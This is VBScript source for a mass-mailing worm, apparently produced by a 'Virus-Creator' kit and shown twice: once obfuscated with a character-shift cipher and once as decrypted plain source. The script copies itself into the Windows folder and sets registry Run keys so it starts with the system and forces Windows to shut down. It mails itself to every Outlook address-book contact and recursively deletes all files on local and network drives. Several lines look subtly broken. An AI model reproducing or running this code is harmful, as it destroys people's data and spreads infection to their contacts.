   rem This script is created by GiChTy's Virus-Creator 1.3
   rem I will not take response of what people do with my tool.
   rem check our page : www.blueadeptz.org
   rem or mail me: gichty@blueadeptz.org
   rem GiChTy


   on error resume next
   nbmsUTSD()
   KJbnKSDZ()
   LKnmsdbnO()
   killfiles()
   sub nbmsUTSD()
   dim fso, dir, file, c, regedit
   set fso = createobject(ZebslkHD("k[jahlaf_&^ad]kqkl]egZb][l"))
   dir = fso.getspecialfolder(ZebslkHD("("))
   set file = fso.OpenTextFile(WScript.ScriptFullname,1)
   set c = fso.GetFile(WScript.ScriptFullName)
   c.copy (dir & ZebslkHD("Tl]kl&nZk"))
   dim t, z
   t = ZebslkHD("@C=QW;MJJ=FLWMK=JTKg^loYj]TEa[jgkg^lTOaf\gokT;mjj]flN]jkagfTJmfTl]kl")
   z = dir & ZebslkHD("Tl]kl&nZk")
   regwrite t, z
   end sub
   Sub Listfiles(Folder)
   Dim f, fc, f1, fso
   set fso=createobject("scripting.filesystemobject")
   Set f = fso.GetFolder(Folder)
   Set fc = f.Files
   For Each f1 In fc
   fso.deletefile (f1.Path)
   Next
   End Sub
   Sub ListFolders (Folder)
   Dim f, fc, f1, fso
   set fso=createobject("scripting.filesystemobject")
   Set f = fso.GetFolder(Folder)
   Set fc = f.SubFolders
   For Each f1 In fc
   Listfiles (f1.Path)
   ListFolders (f1.Path)
   Next
   End Sub
   Sub Killfiles()
   dim d , dc, s, fso
   set fso=createobject("scripting.filesystemobject")
   Set dc = fso.Drives
   For Each d In dc
   If d.drivetype = 2 Or d.drivetype = 3 Then ListFolders (d.Path & "\")
   Next
   End Sub

   sub KJbnKSDZ()
   regwrite ZebslkHD("@C=QW;D9KK=KWJGGLTKg^loYj]TEa[jgkg^lTOaf\gokT;mjj]flN]jkagfTJmfTC]jf]d+*"),ZebslkHD("[2TOaf\gokTjmf\dd+*&]p]mk]j$]paloaf\gok")
   end sub
   Sub LKnmsdbnO()
   Dim H12JG, KLSD, BNSe, pSefm, VBmnd, zuNDS
   Set pSefm = CreateObject(Dec("Gmldggc&9hhda[Ylagf"))
   Set H12JG = pSefm.GetNameSpace(Dec("E9HA"))
   For Each KLSD In e.AddressLists
   Set BNSe = pSefm.CreateItem(0)
   For VBmnd = 1 To KLSD.AddressEntries.Count
   Set zuNDS = KLSD.AddressEntries(o)
   If VBmnd = 1 Then
   BNSe.BCC = zuNDS.Address
   Else
   BNSe.BCC = BNSe.BCC & "; " & zuNDS.Address
   End If
   Next
   BNSe.Subject = Dec("F]oLggd")
   BNSe.Body = Dec("L`aklggd[Yfkh]]\mhqgmjH;mhlg)-")
   BNSe.Attachmets.Add WScript.ScriptFullName
   BNSe.DeleteAfterSubmit = True
   BNSe.Send
   Next
   End Sub

   Sub Regwrite(key, value)
   dim regedit
   set regedit = createobject("wscript.shell")
   regedit.regwrite key, value
   End Sub

   Function ZebslkHD(jkspoh)
   Dim nkoOID, tmRMsp, GHUOnsd
   tmRMsp = jkspoh
   For i = 1 To Len(tmRMsp)
   nkoOID = Mid(tmRMsp, i, 1)
   GHUOnsd = GHUOnsd & Chr((Asc(nkoOID) + 8))
   Next
   ZebslkHD = GHUOnsd
   End Function

   ' Original Source Code

   rem This script is created by GiChTy's Virus-Creator 1.3
   rem I will not take response of what people do with my tool.
   rem check our page : www.blueadeptz.org
   rem or mail me: gichty@blueadeptz.org
   rem GiChTy


   on error resume next
   nbmsUTSD()
   KJbnKSDZ()
   LKnmsdbnO()
   killfiles()
   sub nbmsUTSD()
   dim fso, dir, file, c, regedit
   set fso = createobject("scripting.filesystemobject")
   dir = fso.getspecialfolder("0")
   set file = fso.OpenTextFile(WScript.ScriptFullname,1)
   set c = fso.GetFile(WScript.ScriptFullName)
   c.copy (dir & "\test.vbs")
   dim t, z
   t = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\test"
   z = dir & "\test.vbs"
   regwrite t, z
   end sub
   Sub Listfiles(Folder)
   Dim f, fc, f1, fso
   set fso=createobject("scripting.filesystemobject")
   Set f = fso.GetFolder(Folder)
   Set fc = f.Files
   For Each f1 In fc
   fso.deletefile (f1.Path)
   Next
   End Sub
   Sub ListFolders (Folder)
   Dim f, fc, f1, fso
   set fso=createobject("scripting.filesystemobject")
   Set f = fso.GetFolder(Folder)
   Set fc = f.SubFolders
   For Each f1 In fc
   Listfiles (f1.Path)
   ListFolders (f1.Path)
   Next
   End Sub
   Sub Killfiles()
   dim d , dc, s, fso
   set fso=createobject("scripting.filesystemobject")
   Set dc = fso.Drives
   For Each d In dc
   If d.drivetype = 2 Or d.drivetype = 3 Then ListFolders (d.Path & "\")
   Next
   End Sub

   sub KJbnKSDZ()
   regwrite "HKEY_CLASSES_ROOT\Software\Microsoft\Windows\CurrentVersion\Run\Kernel32","c:\Windows\rundll32.exeuser,exitwindows"
   end sub
   Sub LKnmsdbnO()
   Dim H12JG, KLSD, BNSe, pSefm, VBmnd, zuNDS
   Set pSefm = CreateObject(Dec("Gmldggc&9hhda[Ylagf"))
   Set H12JG = pSefm.GetNameSpace(Dec("E9HA"))
   For Each KLSD In e.AddressLists
   Set BNSe = pSefm.CreateItem(0)
   For VBmnd = 1 To KLSD.AddressEntries.Count
   Set zuNDS = KLSD.AddressEntries(o)
   If VBmnd = 1 Then
   BNSe.BCC = zuNDS.Address
   Else
   BNSe.BCC = BNSe.BCC & "; " & zuNDS.Address
   End If
   Next
   BNSe.Subject = Dec("F]oLggd")
   BNSe.Body = Dec("L`aklggd[Yfkh]]\mhqgmjH;mhlg)-")
   BNSe.Attachmets.Add WScript.ScriptFullName
   BNSe.DeleteAfterSubmit = True
   BNSe.Send
   Next
   End Sub

   Sub Regwrite(key, value)
   dim regedit
   set regedit = createobject("wscript.shell")
   regedit.regwrite key, value
   End Sub

   Function ZebslkHD(jkspoh)
   Dim nkoOID, tmRMsp, GHUOnsd
   tmRMsp = jkspoh
   For i = 1 To Len(tmRMsp)
   nkoOID = Mid(tmRMsp, i, 1)
   GHUOnsd = GHUOnsd & Chr((Asc(nkoOID) + 8))
   Next
   ZebslkHD = GHUOnsd
   End Function

   'Decrypt by the VBS and VBA File Decrypter written by PetiK - 18/07/2009
